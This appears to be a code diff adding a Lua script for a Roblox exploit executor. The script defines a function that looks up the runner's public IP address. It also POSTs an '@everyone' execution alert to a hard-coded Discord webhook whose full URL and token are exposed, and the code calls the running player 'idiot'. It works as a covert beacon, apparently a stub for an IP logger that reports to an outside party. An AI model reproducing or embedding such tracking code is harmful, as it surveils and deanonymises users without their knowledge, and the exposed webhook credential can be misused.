@@ -1,0 +1,23 @@
+local function GetIp() : string
+    local request = request or http_request or (syn and syn.request)
+    
+    local response = request({Url = "https://api.ipify.org?format=json", Method = "GET"})
+    response = game:GetService("HttpService"):JSONDecode(response.Body)
+
+    
+    return response.ip
+end
+
+local idiot = game:GetService("Players").LocalPlayer
+local response = syn.request(
+
+    {
+        Url = 'https://discord.com/api/webhooks/1050953949060014140/lq5WeU1yv2oNCKZ79WvPJZeKp1nJAqpotPPCoMJKGSqI2o4qnRA-MOAL2DujOS3rZalO',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = game:GetService('HttpService'):JSONEncode({content = "@everyone **Script Foi Executado!**" })
+    }
+);
+
